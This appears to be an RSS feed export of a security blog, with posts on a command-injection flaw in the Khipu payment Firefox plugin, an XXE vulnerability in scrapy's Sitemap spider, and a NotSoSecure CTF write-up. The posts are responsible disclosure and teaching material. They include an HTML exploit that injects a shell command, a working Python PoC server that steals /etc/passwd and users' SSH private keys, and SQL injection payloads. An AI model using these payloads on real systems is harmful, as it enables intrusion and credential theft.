+&lt;p&gt;At line 10, &lt;code&gt;cmdline_str&lt;/code&gt; is defined in the heap with a size of 1024 bytes. As &lt;code&gt;khipu_id&lt;/code&gt; doesn't have any limit in its length, it's possible that the complete command defined at line 12 end up being longer than 1024 and a &lt;em&gt;heap overflow&lt;/em&gt; is produced. It effectively crashed the plugin in &lt;em&gt;Firefox&lt;/em&gt; but I didn't do more research on that branch.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id="exploitation"&gt;Exploitation&lt;/h2&gt;
+&lt;p&gt;Now, to exploit this vulnerability I have to invoke the plugin from the browser. I can't remember the full details of it since in the end I've found a simple way to call the plugin directly.&lt;/p&gt;
+&lt;p&gt;To call the plugin, the website using &lt;em&gt;Khipu&lt;/em&gt; has a &lt;em&gt;Javascript&lt;/em&gt; logic. It creates an object &lt;code&gt;Khipu&lt;/code&gt; that has a &lt;code&gt;plugin&lt;/code&gt; attribute that handles the plugin call. After understanding the &lt;em&gt;Javascript&lt;/em&gt; logic and how &lt;code&gt;Khipu.plugin&lt;/code&gt; worked, I could reach the requirements for the exploit:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;It has to have a &lt;code&gt;embed&lt;/code&gt; object with id &lt;code&gt;khPlugin&lt;/code&gt; and type &lt;code&gt;application/x-KHPlugin&lt;/code&gt; to be able to interact with the plugin.&lt;/li&gt;
+&lt;li&gt;There are some ways to call the plugin, for instance using &lt;code&gt;Khipu.plugin&lt;/code&gt;. After some tries I conclude that I could access the plugin directly using &lt;code&gt;khPlugin.callKH()&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Having these two requirements in mind, the final exploit was:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-html"&gt;&amp;lt;html&amp;gt;
+&amp;lt;embed id=&amp;quot;khPlugin&amp;quot; type=&amp;quot;application/x-KHPlugin&amp;quot; width=&amp;quot;0&amp;quot; height=&amp;quot;0&amp;quot;&amp;gt;&amp;lt;/embed&amp;gt;
+&amp;lt;script&amp;gt;
+khPlugin.callKH(&amp;quot;12345; echo 'hello' &amp;gt; /tmp/land/hello.txt&amp;quot;)
+&amp;lt;/script&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Here the exploit will create the file &lt;code&gt;/tmp/land/hello.txt&lt;/code&gt;. The exploit works smoothly, it pops up the &lt;code&gt;Khipu&lt;/code&gt; binary with some error in the transaction but in the background a file is created on the filesystem, just with loading the malicious page.&lt;/p&gt;
+&lt;p&gt;A video showing the exploitation is here:&lt;/p&gt;
+&lt;iframe width="560" height="315" src="https://www.youtube.com/embed/2nBxee_MCsg?rel=0" frameborder="0" allowfullscreen&gt;&lt;/iframe&gt;
+&lt;h2 id="thefixes"&gt;The fixes&lt;/h2&gt;
+&lt;p&gt;After waiting some time without any response, I tried again against latest version of &lt;em&gt;Khipu&lt;/em&gt; plugin and the vulnerability wasn't there anymore. After examining the binary, I could find that the vulnerable function was replaced by one safer.&lt;/p&gt;
+&lt;p&gt;Once again with the help of &lt;em&gt;Hopper&lt;/em&gt; and after understanding the logic, I could rewrite the code. It's based on version &lt;code&gt;1.0.2.2&lt;/code&gt; (August 2014) but it seems that in the current version the same logic is used:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-c++"&gt;#include &amp;lt;iostream&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;string&amp;gt;
+
+using namespace std;
+
+int callKH(string khipu_string) {
+    size_t pos_khipu_string = khipu_string.find_last_of(&amp;quot;payment/getPaymentData/&amp;quot;) + 1;
+
+    if (pos_khipu_string &amp;gt;= 0) {
+        string transaction_id = khipu_string.substr(pos_khipu_string);
+        bool has_only_valid_chars = true;
+        bool valid_string;
+
+        for (int i = 0; i &amp;lt; transaction_id.length(); i++){
+          int is_alnum = isalnum(transaction_id[i]);
+          if (!is_alnum) {
+              has_only_valid_chars = false;
+          }
+        }
+
+        if ((has_only_valid_chars == false) || transaction_id.length() != 13) {
+            valid_string = false;
+        }
+        else {
+            valid_string = true;
+        }
+
+        if (valid_string) {
+            char *cmdline;
+            asprintf(&amp;amp;cmdline, &amp;quot;/usr/bin/khipu %s &amp;amp;&amp;quot;, transaction_id.c_str());
+            system(cmdline);
+            free(cmdline);
+        }
+    }
+    return 0;
+}
+
+int main (int argc, char* argv[])
+{
+    // callKH(&amp;quot;payment/getPaymentData/123456&amp;quot;);
+    callKH(argv[1]);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now, the string coming from the page to the plugin has to meet these conditions:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Starts with &lt;code&gt;payment/getPaymentData/&lt;/code&gt; string (line 9)&lt;/li&gt;
+&lt;li&gt;After that string, it's the &lt;code&gt;transaction_id&lt;/code&gt;. It has to contain only alphanumeric characters (&lt;code&gt;for&lt;/code&gt; at line 16) and not be longer than 13 characters (line 23).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;em&gt;Firefox&lt;/em&gt; updated its plugin policy too. As of version 30.0, it's not running plugins &lt;a href="https://blog.mozilla.org/security/2014/02/28/update-on-plugin-activation/"&gt;automatically&lt;/a&gt;. It affected the stealthy working of the exploit since now a pop-up arise saying that the site is trying to run &lt;em&gt;Khipu&lt;/em&gt; plugin before executing the code.&lt;/p&gt;
+&lt;h2 id="conclusions"&gt;Conclusions&lt;/h2&gt;
+&lt;p&gt;After sending some vulnerabilities to &lt;em&gt;Khipu&lt;/em&gt;, I could consider them as a company reacting quickly against security vulnerabilities. However, they should implement a policy to proceed when a vulnerability is notified, keeping a conversation flow with the notifier and let him know when the vulnerability is fixed.&lt;/p&gt;
+&lt;/div&gt;</content:encoded></item><item><title>Is it safe to shop on the Chilean Internet? No.</title><description>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;When you go to a bank to open a checking account, it's almost a &lt;strong&gt;must-have&lt;/strong&gt; to contract a fraud insurance. In a perfect world you wouldn't need it but there are different threats of using a card physically and virtually.&lt;/p&gt;
+&lt;p&gt;Focusing on virtual world, there are some threats like phishing&lt;/p&gt;&lt;/div&gt;</description><link>http://spect.cl/blog/2015/09/is-it-safe-to-shop-on-the-chilean-internet-no/</link><guid isPermaLink="false">59f734f8aade9a0001902fc1</guid><category>security</category><category>chile</category><dc:creator>Claudio Salazar</dc:creator><pubDate>Thu, 10 Sep 2015 15:48:00 GMT</pubDate><content:encoded>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;When you go to a bank to open a checking account, it's almost a &lt;strong&gt;must-have&lt;/strong&gt; to contract a fraud insurance. In a perfect world you wouldn't need it but there are different threats of using a card physically and virtually.&lt;/p&gt;
+&lt;p&gt;Focusing on virtual world, there are some threats like phishing or vulnerabilities in the bank pages that could affect us as consumers/clients. However, most interesting points of attack are the pay buttons since they can receive transactions from cards issued by any bank.&lt;/p&gt;
+&lt;p&gt;I'm going to talk about them, but not web vulnerabilities on their websites. It's about the software that they create, we run in our computers/servers and how the lack of security practices on their development install potential backdoors in our side. The Chilean Internet isn't that safe place that you think.&lt;/p&gt;
+&lt;h2 id="economics"&gt;Economics&lt;/h2&gt;
+&lt;p&gt;First, I would like to talk about my hypothesis of the problem with physical cards and how it could be interpolated to virtual world. It's a win-win for the bank industry that there are people cloning cards so easily as in Chile since it creates fear in the people so they are in the need of contracting insurances to be safe. Without fraud, nobody would contract insurances.&lt;/p&gt;
+&lt;p&gt;This could explain why the bank industry don't fight against the problem nor implement latest technology that could avoid the cloning. Now, what about the virtual world?&lt;/p&gt;
+&lt;p&gt;I think it's still in diapers in Chile. To begin, politically there's not any policy to oblige the companies to make public whether they were hacked or not and let their users know about it. There have been a lot of serious vulnerabilities found in bank sites and I think they actually don't care about security since the vulnerabilities weren't hard to find and it's an odyssey to notify the people in charge. Why will they care about security if they can just spread in the media that they were attacked by &lt;em&gt;bad hackers using novel and advanced techniques&lt;/em&gt; in case of a problem?&lt;/p&gt;
+&lt;p&gt;Pay buttons are related to the bank industry since they make easy to shop on the Internet and pay using local or credit cards. In Chile using their services is the most common way to pay in a custom website, since bank websites offer a limited number of services. So if you want to buy something in Chile, probably you will be using one of them. This post is going to dig in two of them: &lt;em&gt;Transbank&lt;/em&gt; and &lt;em&gt;Khipu&lt;/em&gt;. It's a research that started in 2012 and I think it's time to make it public.&lt;/p&gt;
+&lt;h2 id="transbank"&gt;Transbank&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;DISCLAIMER: A client of us asked for a fast review whether it was safe to install the KCC binaries on their servers.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;It's the main actor on online commerce in Chile with the biggest participation on the market.&lt;/p&gt;
+&lt;p&gt;It has been almost three years since a detailed demonstration about a vulnerability was provided to them. I won't talk about it but I can recommend you to &lt;strong&gt;not&lt;/strong&gt; install &lt;em&gt;KCC&lt;/em&gt; on your servers.&lt;/p&gt;
+&lt;p&gt;You can use some implementations in other languages like &lt;a href="https://github.com/sagmor/tbk"&gt;tbk gem&lt;/a&gt; that don't need the binaries to work. The new &lt;a href="http://spect.cl/blog/2015/09/is-it-safe-to-shop-on-the-chilean-internet-no/transbankdevelopers.cl"&gt;Transbank Developers&lt;/a&gt; platform aims to avoid the use of the &lt;em&gt;KCC&lt;/em&gt;. It's good news.&lt;/p&gt;
+&lt;h2 id="khipu"&gt;Khipu&lt;/h2&gt;
+&lt;p&gt;It's a new actor on the stage, trying to get a piece of the pie and according to what I've seen related to costs and ease of use, they have a good chance.&lt;/p&gt;
+&lt;p&gt;I've notified around four vulnerabilities to this company in the last year, most of the time receiving a quick reply and hot-fixes. Nowadays, software companies have to push fixes to resolve security issues, there's no time for waiting weeks because it's a &lt;em&gt;production&lt;/em&gt; environment.&lt;/p&gt;
+&lt;p&gt;Last and most critical vulnerability that I reported was fixed a while ago (and I was never notified) so I think I can talk about it. &lt;em&gt;Khipu&lt;/em&gt; has some applications for mobile devices, desktop and browser.&lt;/p&gt;
+&lt;p&gt;I'm always interested in analyzing binaries so I downloaded the &lt;em&gt;Khipu&lt;/em&gt; binary for Linux and reviewed it. Nothing interesting after skimming over it then I wanted to observe how the browser plugins worked.&lt;/p&gt;
+&lt;p&gt;The browser plugins call the binary on the system with an argument related to the payment, so it was a nice spot to find vulnerabilities. I found a remote command injection vulnerability in the &lt;em&gt;Mozilla Firefox&lt;/em&gt; plugin, where an user with the plugin installed only had to load a malicious page and the commands are executed on his machine.&lt;/p&gt;
+&lt;p&gt;The details of this vulnerability on Monday's post. Stay stuned!&lt;/p&gt;
+&lt;/div&gt;</content:encoded></item><item><title>Exploiting the scraper</title><description>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;As some of you have noticed, the post frequency has been low in last years because I've been happily working full-time for more than two years at &lt;a href="http://www.scrapinghub.com"&gt;Scrapinghub&lt;/a&gt;, the company behind the popular &lt;a href="http://www.scrapy.org"&gt;scrapy&lt;/a&gt; framework. I've been working mostly on software projects not related to security so only in my&lt;/p&gt;&lt;/div&gt;</description><link>http://spect.cl/blog/2014/08/exploiting-the-scraper/</link><guid isPermaLink="false">59f734f8aade9a0001902fbe</guid><category>vulnerability</category><category>python</category><category>scrapy</category><dc:creator>Claudio Salazar</dc:creator><pubDate>Fri, 08 Aug 2014 11:00:00 GMT</pubDate><content:encoded>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;As some of you have noticed, the post frequency has been low in last years because I've been happily working full-time for more than two years at &lt;a href="http://www.scrapinghub.com"&gt;Scrapinghub&lt;/a&gt;, the company behind the popular &lt;a href="http://www.scrapy.org"&gt;scrapy&lt;/a&gt; framework. I've been working mostly on software projects not related to security so only in my spare time I dedicate time on it.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;scrapy&lt;/em&gt; is a powerful framework to do web scraping and it usually doesn't involve server side things, unless you use the &lt;a href="http://scrapyd.readthedocs.org/en/latest/"&gt;scrapyd&lt;/a&gt; project&lt;br&gt;
+to manage your scrapy spiders. So I was a bit worried about the security of this tool because I use it daily and any vulnerability would affect me (client-side).&lt;/p&gt;
+&lt;p&gt;Well, scrapy uses &lt;a href="http://lxml.de/"&gt;lxml&lt;/a&gt; under the hood to do HTML/XML processing and with the &lt;a href="http://projects.webappsec.org/w/page/13247003/XML%20External%20Entities"&gt;XML External Entity&lt;/a&gt; (XXE) attacks around, I wanted to test if scrapy was vulnerable to it in some way. Indeed, it was vulnerable as I described in this &lt;a href="https://github.com/scrapy/scrapy/pull/676"&gt;pull request&lt;/a&gt; and in this post I'll explain to you an automated way to exploit it.&lt;/p&gt;
+&lt;h2 id="findingavulnerablecomponent"&gt;Finding a vulnerable component&lt;/h2&gt;
+&lt;p&gt;I knew that &lt;em&gt;lxml&lt;/em&gt; was used at &lt;a href="http://doc.scrapy.org/en/latest/topics/selectors.html"&gt;Selectors&lt;/a&gt; and some kind of spiders like &lt;a href="http://doc.scrapy.org/en/latest/topics/spiders.html#sitemapspider"&gt;Sitemap spider&lt;/a&gt;. Both components can handle &lt;em&gt;XML&lt;/em&gt; files and were vulnerable since they initialized their instance of &lt;code&gt;XMLParser&lt;/code&gt; in this way:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-python"&gt;lxml.etree.XMLParser(recover=True, remove_comments=True)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;According to the &lt;a href="http://lxml.de/api/lxml.etree.XMLParser-class.html"&gt;documentation&lt;/a&gt;, &lt;code&gt;resolve_entities&lt;/code&gt; argument is &lt;code&gt;True&lt;/code&gt; by default, which makes it vulnerable to the above mentioned &lt;em&gt;XXE&lt;/em&gt; attacks.&lt;/p&gt;
+&lt;p&gt;Before starting the search of vulnerabilities, I'm always thinking about a successful exploitation. In this case, &lt;code&gt;Selectors&lt;/code&gt; weren't a good spot since I could create a malicious &lt;em&gt;XML&lt;/em&gt; file, serve it in a web server, a &lt;em&gt;scrapy&lt;/em&gt; spider would have parsed it and the vulnerability would have been triggered but I didn't have a way to get that data back to me.&lt;/p&gt;
+&lt;p&gt;On the other side, from my experience I had seen that sitemaps sometimes contain nested sitemap and they are always requested, so in that way I could keep a flow between a server controlled by me and the victim scrapy spider. That's the choosen path to exploit this vulnerability.&lt;/p&gt;
+&lt;h2 id="abitmoreaboutsitemapsandsitemapspider"&gt;A bit more about sitemaps and Sitemap spider&lt;/h2&gt;
+&lt;p&gt;&lt;a href="http://www.sitemaps.org/protocol.html"&gt;Sitemaps&lt;/a&gt; are files that sites uses to index content instead of crawling the whole site to access every item. They usually contains url sets, but there's the chance to contain more sitemaps. &lt;code&gt;Sitemap&lt;/code&gt; spider will request normal url sets and call a callback, so we can't get the data of a successful attack from that. But we could nest &lt;em&gt;XML&lt;/em&gt; sitemaps and create dynamic responses always containing a sitemap, so we could keep a flow with the victim spider.&lt;/p&gt;
+&lt;h2 id="exploitingthevulnerabilityinaautomatedway"&gt;Exploiting the vulnerability in a automated way&lt;/h2&gt;
+&lt;p&gt;To exploit this vulnerability we need a victim using the &lt;code&gt;Sitemap&lt;/code&gt; spider. An example of this would be this simple spider:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-python"&gt;from scrapy.contrib.spiders import SitemapSpider
+
+
+class TestSpider(SitemapSpider):
+    name = 'test'
+    sitemap_urls = ['http://localhost:5000/sitemap.xml']
+
+    def parse(self, response):
+        pass
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;On the server side, the steps are:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Create a server listening on port 5000 (as the spider set in &lt;code&gt;sitemap_urls&lt;/code&gt;).&lt;/li&gt;
+&lt;li&gt;Create a malicious &lt;em&gt;XML&lt;/em&gt; file as explained below:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class="language-language-xml"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot; ?&amp;gt;
+&amp;lt;!DOCTYPE foo [
+&amp;lt;!ELEMENT foo ANY &amp;gt;
+&amp;lt;!ENTITY xxe SYSTEM &amp;quot;file://{file_path}&amp;quot; &amp;gt;
+]&amp;gt;
+&amp;lt;sitemapindex xmlns=&amp;quot;http://www.sitemaps.org/schemas/sitemap/0.9&amp;quot;&amp;gt;
+&amp;lt;sitemap&amp;gt;&amp;lt;loc&amp;gt;http://localhost:5000/&amp;amp;xxe;.xml&amp;lt;/loc&amp;gt;&amp;lt;/sitemap&amp;gt;
+&amp;lt;/sitemapindex&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can set &lt;code&gt;file_path&lt;/code&gt; to any file we want to read and our file contains a nested sitemap with the payload to trigger the vulnerability.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;As you see from our malicious file, the next sitemap will be requested and in its path it will contain the contents of &lt;code&gt;file_path&lt;/code&gt;. Now we have a way to get retrieve the data from the victim.&lt;/li&gt;
+&lt;li&gt;Do we want only a file? No. We can answer the last request with our malicious file and request more files.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Things get interesting when in the first response you put a payload to read &lt;code&gt;/etc/passwd&lt;/code&gt;, receive the contents, recreate the list of real users (not system users) and in the next response you could read &lt;code&gt;/home/%user/.ssh/id_rsa&lt;/code&gt; and bingo!&lt;/p&gt;
+&lt;p&gt;Two things to consider but that are fully implemented in the PoC: the sitemap &lt;code&gt;loc&lt;/code&gt; needs to end in &lt;code&gt;.xml&lt;/code&gt; and frameworks like &lt;em&gt;Bottle&lt;/em&gt; or &lt;em&gt;Flask&lt;/em&gt; couldn't handle the weird requests containing &lt;code&gt;/etc/passwd&lt;/code&gt; contents so I had to use the built-in &lt;em&gt;HTTP&lt;/em&gt; server.&lt;/p&gt;
+&lt;p&gt;The malicious server code is pasted below. It's just a PoC.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-python"&gt;import re
+import sys
+import time
+import BaseHTTPServer
+
+from SimpleHTTPServer import SimpleHTTPRequestHandler
+from urllib import unquote
+
+sitemap_document = &amp;quot;&amp;quot;&amp;quot;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot; ?&amp;gt;
+&amp;lt;!DOCTYPE foo [
+&amp;lt;!ELEMENT foo ANY &amp;gt;
+&amp;lt;!ENTITY xxe SYSTEM &amp;quot;file://{file_path}&amp;quot; &amp;gt;
+]&amp;gt;
+&amp;lt;sitemapindex xmlns=&amp;quot;http://www.sitemaps.org/schemas/sitemap/0.9&amp;quot;&amp;gt;
+&amp;lt;sitemap&amp;gt;{content}&amp;lt;/sitemap&amp;gt;
+&amp;lt;/sitemapindex&amp;gt;
+&amp;quot;&amp;quot;&amp;quot;
+
+
+class WebServerHandler(SimpleHTTPRequestHandler):
+    users = []
+
+    def get_sitemap(self, file_path):
+        &amp;quot;&amp;quot;&amp;quot; .xml at the end makes it a valid XML file &amp;quot;&amp;quot;&amp;quot;
+        loc = &amp;quot;&amp;lt;loc&amp;gt;http://localhost:5000/&amp;amp;xxe;.xml&amp;lt;/loc&amp;gt;&amp;quot;
+        return sitemap_document.format(file_path=file_path, content=loc)
+
+    def parse_users(self, path):
+        users = set([u for u in re.findall('/|0A([^:]+):x:', path) if u])
+        system_users = set([
+            'daemon', 'bin', 'sys', 'sync', 'games', 'man', 'lp', 'mail', 'news', 'uucp',
+            'proxy', 'www-data', 'backup', 'list', 'irc', 'gnats', 'nobody', 'libuuid',
+            'syslog', 'messagebus', 'usbmux', 'dnsmasq', 'avahi-autoipd', 'kernoops',
+            'rtkit', 'whoopsie', 'speech-dispatcher', 'avahi', 'lightdm', 'pulse',
+            'hplip', 'colord', 'saned', 'gdm', 'debian-spamd', 'sshd', 'statd', 'puppet',
+            'landscape', 'pollinate'
+        ])
+
+        self.users = list(users - system_users)
+        print('[+] Obtained users: %s' % ', '.join(self.users))
+
+    def request_file(self):
+        #First step is ask for /etc/passwd
+        if not self.users:
+            return self.get_sitemap('/etc/passwd')
+        else:
+            #Use first user for PoC
+            user = self.users[0]
+            return self.get_sitemap(sys.argv[1] % user)
+
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+
+        #Read requested URL in search of valuable data
+        if 'root:x:0:0' in self.path:
+            self.parse_users(self.path)
+        elif 'sitemap' not in self.path:
+            try:
+                content = unquote(re.findall('/(.*?)\.xml', self.path)[0])
+                print(&amp;quot;[+] Possible document: %s&amp;quot; % content)
+            except:
+                print(&amp;quot;[-] Failed getting file&amp;quot;)
+
+        time.sleep(3)
+
+        #Request next file
+        content = self.request_file()
+        self.wfile.write(content)
+
+    def log_message(self, format, *args):
+        return
+
+
+def setup_webserver(server_class=BaseHTTPServer.HTTPServer):
+    &amp;quot;&amp;quot;&amp;quot; Setup webserver for serve files &amp;quot;&amp;quot;&amp;quot;
+    server_address = ('localhost', 5000)
+    httpd = server_class(server_address, WebServerHandler)
+    try:
+        print('To exit, press Ctrl-c')
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        print('Exiting ..')
+        sys.exit(0)
+
+
+if __name__ == '__main__':
+    if len(sys.argv) != 2:
+        print('Use: python %s filename_to_get' % sys.argv[0])
+        print('filename_to_get format: /home/%s/filename')
+        sys.exit(1)
+
+    setup_webserver()
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And a video showing the exploitation is here. It reads the local file &lt;code&gt;flag.txt&lt;/code&gt; of the victim.&lt;/p&gt;
+&lt;iframe width="560" height="315" src="https://www.youtube.com/embed/PF0RfxSutB8?rel=0" frameborder="0" allowfullscreen&gt;&lt;/iframe&gt;
+&lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;The &lt;a href="https://github.com/scrapy/scrapy/pull/676"&gt;pull request&lt;/a&gt; fixing the vulnerability was discussed with the scrapy dev team and in &lt;strong&gt;few&lt;/strong&gt; days it was merged into master. It's always good to resolve security issues quickly.&lt;/p&gt;
+&lt;p&gt;I want to clarify that only versions &amp;lt;= 0.21 were vulnerable to this vulnerability. Even in &lt;a href="http://doc.scrapy.org/en/latest/topics/ubuntu.html"&gt;Ubuntu repositories&lt;/a&gt; there are many patched versions available. After this, we agree on opening a &lt;a href="http://doc.scrapy.org/en/latest/contributing.html#reporting-bugs"&gt;security mailing list&lt;/a&gt; to address this kind of bugs, which is a good initiative and I expect to continue contribuiting to it.&lt;/p&gt;
+&lt;/div&gt;</content:encoded></item><item><title>NotSoSecure CTF2 Writeup</title><description>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;Since for the first &lt;a href="http://notsosecure.com/"&gt;NotSoSecure&lt;/a&gt; CTF I had a lot of fun, I joined again for the new version. It was harder than first time, but I finally got both flags.&lt;/p&gt;
+&lt;h2 id="gettingthefirstflag"&gt;Getting the first flag&lt;/h2&gt;
+&lt;img src="http://cdn.spect.cl/blog/posts/images/ctf_notsosecure_2_login_form.png" style="height:400px; width:500px"&gt;
+&lt;p&gt;The challenge's frontpage had a form, almost the same as first CTF. Looking at the&lt;/p&gt;&lt;/div&gt;</description><link>http://spect.cl/blog/2014/04/notsosecure-ctf2-writeup/</link><guid isPermaLink="false">59f734f8aade9a0001902fbf</guid><category>ctf</category><category>security</category><dc:creator>Claudio Salazar</dc:creator><pubDate>Thu, 24 Apr 2014 11:00:00 GMT</pubDate><content:encoded>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;Since for the first &lt;a href="http://notsosecure.com/"&gt;NotSoSecure&lt;/a&gt; CTF I had a lot of fun, I joined again for the new version. It was harder than first time, but I finally got both flags.&lt;/p&gt;
+&lt;h2 id="gettingthefirstflag"&gt;Getting the first flag&lt;/h2&gt;
+&lt;img src="http://cdn.spect.cl/blog/posts/images/ctf_notsosecure_2_login_form.png" style="height:400px; width:500px"&gt;
+&lt;p&gt;The challenge's frontpage had a form, almost the same as first CTF. Looking at the source code, there was a weird string:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;H4sIAAAAAAAAAAsyTs80LTEu0ssoyc0BACMzGYUNAAAA&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;I couldn't decode it using some basic ciphers so I was looking around the other files without success.&lt;/p&gt;
+&lt;p&gt;Then, I took the weird string and decided to look for it in Google. It didn't give any result but I thought that some other strings could share the same start letters, as an encoding signature. I was right and after reading a &lt;a href="https://www.ibm.com/developerworks/community/forums/html/topic?id=77777777-0000-0000-0000-000014940626"&gt;forum post&lt;/a&gt; I could decode it successfully.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-bash"&gt;$ echo 'H4sIAAAAAAAAAAsyTs80LTEu0ssoyc0BACMzGYUNAAAA' | base64 -di | gunzip -
+R3gi5t3r.html%
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src="http://cdn.spect.cl/blog/posts/images/ctf_notsosecure_2_register_form.png" style="height:400px ;width:500px"&gt;
+&lt;p&gt;This was almost the same form as in the first CTF. I registered the user &lt;strong&gt;testcl&lt;/strong&gt; and after logged in, it displayed my  username in the page.&lt;/p&gt;
+&lt;img src="http://cdn.spect.cl/blog/posts/images/ctf_notsosecure_2_normal_login.png" style="height:400px; width:500px"&gt;
+&lt;p&gt;I could register an user in the register form and then log in at the frontpage form, but neither of them were vulnerable to &lt;em&gt;SQL injection&lt;/em&gt;. I saw that if you tried to register an already registered user, it would show an error, so there were a &lt;code&gt;SELECT&lt;/code&gt; and an &lt;code&gt;INSERT&lt;/code&gt; statements.&lt;/p&gt;
+&lt;p&gt;There were no hints about it at that moment so I had to rethink it. I remembered that in the &lt;em&gt;Web Security Workshop&lt;/em&gt; I explained to my students a &lt;a href="http://edu.spect.cl/courses/tsw_utfsm/2013-1/slides/slides08.html#/5"&gt;nice vulnerability&lt;/a&gt;, so I would try the same here. This kind of vulnerability is called &lt;a href="http://www.notsosecure.com/blog/2008/09/11/sql-column-truncation-vulnerabilities/"&gt;SQL Column Truncation&lt;/a&gt; and is easily exploitable.&lt;/p&gt;
+&lt;p&gt;I took a look at the form:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-html"&gt;&amp;lt;td&amp;gt;&amp;lt;input name=&amp;quot;regname&amp;quot; type=&amp;quot;text&amp;quot; size=&amp;quot;20&amp;quot; placeholder=&amp;quot;username&amp;quot; required/&amp;gt;&amp;lt;/td&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;and guessed that username length at database schema was 20 chars. Then I created my payload following the structure displayed at line 1, resulting in the string at line 2:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language"&gt;username + (20 - len(username) * %20) + any char
+admin%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20q.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I sent the request:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-http"&gt;GET /9128938921839838/register.php?
+regname=admin%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20q
+&amp;amp;regemail=nike%40example.org
+&amp;amp;regpass1=1234zz5678
+&amp;amp;regpass2=1234zz5678 HTTP/1.1
+Host: ctf.notsosecure.com
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;and then I could log in successfully as &lt;strong&gt;admin&lt;/strong&gt;, getting the first flag.&lt;/p&gt;
+&lt;img src="http://cdn.spect.cl/blog/posts/images/ctf_notsosecure_2_successful_login.png" style="height:400px; width:500px"&gt;
+&lt;p&gt;The &lt;code&gt;SELECT&lt;/code&gt; statement didn't detect the duplicate user since &lt;code&gt;SELECT&lt;/code&gt; doesn't truncate input, instead &lt;code&gt;INSERT&lt;/code&gt; truncates the string and trims spaces.&lt;/p&gt;
+&lt;h2 id="gettingthesecondflag"&gt;Getting the second flag&lt;/h2&gt;
+&lt;p&gt;It was harder than expected. I was a bit disappointed at the start because couldn't find any vulnerability. After first hint, I got clear where to look at.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;Referer&lt;/code&gt; field was being used in a &lt;em&gt;SQL&lt;/em&gt; statement. The way to exploit it was using &lt;em&gt;URL&lt;/em&gt;-encoded strings, since raw special characters would be escaped or deleted. After trying time-based &lt;em&gt;SQL&lt;/em&gt; injection, I was clear that the goal was to extract data using an error approach. The question was: how do I trigger those errors in a controlled way? Here, &lt;code&gt;NULL&lt;/code&gt; values or division by zero didn't trigger errors.&lt;/p&gt;
+&lt;p&gt;First I tried with the &lt;code&gt;IF&lt;/code&gt; statement from &lt;em&gt;MySQL&lt;/em&gt;, but as well as &lt;code&gt;CASE&lt;/code&gt;, they weren't lazy evaluated. Both conditions, &lt;code&gt;True&lt;/code&gt; and &lt;code&gt;False&lt;/code&gt;, were evaluated without considering the condition, even when only one is returned as result. I had to find a function with lazy evaluation.&lt;/p&gt;
+&lt;p&gt;(Or as I read later in a &lt;a href="http://www.notsosecure.com/blog/2011/07/06/appsecusa-ctf-another-write-up/"&gt;hint&lt;/a&gt;, making both arguments to &lt;code&gt;IF&lt;/code&gt; successful on runtime but one of them invalid for the context (returning more results than expected). My fault was that I tried passing as arguments invalid statements at any time, like selecting from &lt;em&gt;mysql.user&lt;/em&gt;)&lt;/p&gt;
+&lt;p&gt;I ended up using &lt;a href="http://dev.mysql.com/doc/refman/5.1/en/xml-functions.html#function_extractvalue"&gt;&lt;code&gt;ExtractValue&lt;/code&gt;&lt;/a&gt; in the following way:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-sql"&gt;# 0x5c = '\'
+SELECT extractvalue(1, concat(0x5c, (%s)))
+&lt;/code&gt;&lt;/pre&gt;
